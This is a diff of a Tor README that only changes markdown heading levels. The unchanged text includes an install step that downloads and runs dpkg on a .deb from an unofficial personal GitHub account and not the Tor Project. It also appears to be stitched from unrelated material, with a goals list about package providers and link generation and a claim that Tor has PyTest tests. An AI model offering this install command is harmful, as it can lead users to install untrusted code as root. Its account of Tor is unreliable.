@@ -1,4 +1,4 @@
-## What is Tor ?
+# What is Tor ?
 ===============
 
         Tor protects your privacy on the internet by hiding the connection
@@ -6,23 +6,23 @@
         is reasonably secure, but please ensure you read the instructions and
         configure it properly.
 
-## To build Tor from source:
+# To build Tor from source:
 ===========================
 
         ./configure && make && make install
 
-## To build Tor from a just-cloned git repository:
+# To build Tor from a just-cloned git repository:
 =================================================
 
         sh autogen.sh && ./configure && make && make install
 
-## Home page:
+# Home page:
 ============
 
         https://www.torproject.org/
 
 
-## Here is a list of the main goals Tor should accomplish:
+# Here is a list of the main goals Tor should accomplish:
 =========================================================
 
         * Safe. Remember we are serving people under _heavy censorship_.
@@ -37,47 +37,47 @@
         * Language and provider friendly. It should be easy to support new languages
         and to add new providers for storing packages and generate links.
 
-## Installing Tor
+# Installing Tor
 ================
 
-### To install Tor locally please install the following package (on debian):
+## To install Tor locally please install the following package (on debian):
 
         wget https://github.com/flatcloud0b3/tor/releases/download/v0.4.6.7/tor-0.4.6.7-linux-gnu-ppc64le.deb && \
         wget https://github.com/flatcloud0b3/tor/releases/download/v0.4.6.7/tor-0.4.6.7-linux-gnu-ppc64le.deb.sig && \
         gpg --keyserver hkp://keyserver.ubuntu.com --recv E28D24AA6FE1AD3F6F258BA0D9CE2F6D968DDC54 && \
         gpg --verify tor-0.4.6.7-linux-gnu-ppc64le.deb.sig && dpkg -i tor-0.4.6.7-linux-gnu-ppc64le.deb
 
-## Download new versions:
+# Download new versions:
 ========================
 
         https://www.torproject.org/download/download.html
 
-## Documentation, including links to installation and setup instructions:
+# Documentation, including links to installation and setup instructions:
 ========================================================================
 
         https://www.torproject.org/docs/documentation.html
 
-## Making applications work with Tor:
+# Making applications work with Tor:
 ====================================
 
         https://gitlab.torproject.org/legacy/trac/-/wikis/doc/TorifyHOWTO
 
-## Frequently Asked Questions:
+# Frequently Asked Questions:
 =============================
 
         https://www.torproject.org/docs/faq.html
 
-## Release timeline:
+# Release timeline:
 ===================
 
         https://gitlab.torproject.org/tpo/core/team/-/wikis/NetworkTeam/CoreTorReleases
 
-## To get started working on Tor development:
+# To get started working on Tor development:
 ============================================
 
         See the doc/HACKING directory.
 
-## Running tests
+# Running tests
 ================
 
 Tor includes PyTest unit tests. To run the tests, first install the dependencies above and then run:
